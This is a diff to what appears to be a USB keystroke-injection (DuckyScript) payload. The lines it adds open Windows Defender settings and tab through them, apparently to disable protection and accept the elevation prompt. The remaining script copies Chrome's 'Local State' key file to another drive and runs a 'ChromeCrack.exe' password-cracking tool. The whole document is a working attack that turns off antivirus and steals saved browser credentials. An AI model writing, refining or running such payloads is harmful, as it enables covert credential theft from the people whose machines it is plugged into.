@@ -1,6 +1,23 @@
 DELAY 3000
 GUI r
 DELAY 800
+STRING windowsdefender:
+ENTER
+DELAY 800
+ENTER
+DELAY 800
+TAB
+TAB
+TAB
+TAB
+ENTER
+SPACE
+DELAY 800
+ALT y
+DELAY 800
+ALT F4
+GUI r
+DELAY 800
 STRING powershell
 ENTER
 DELAY 800
@@ -22,7 +39,7 @@ DELAY 800
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "d:\$env:UserName\"
 ENTER
 DELAY 800
-STRING C:\Users\$env:UserName\ChromeCrack\ChromeCrack\ChromeCrack.exe $env:UserName
+STRING C:\Users\$env:UserName\ChromeCracker\ChromeCrack\ChromeCrack.exe $env:UserName
 ENTER
 DELAY 800
 STRING exit
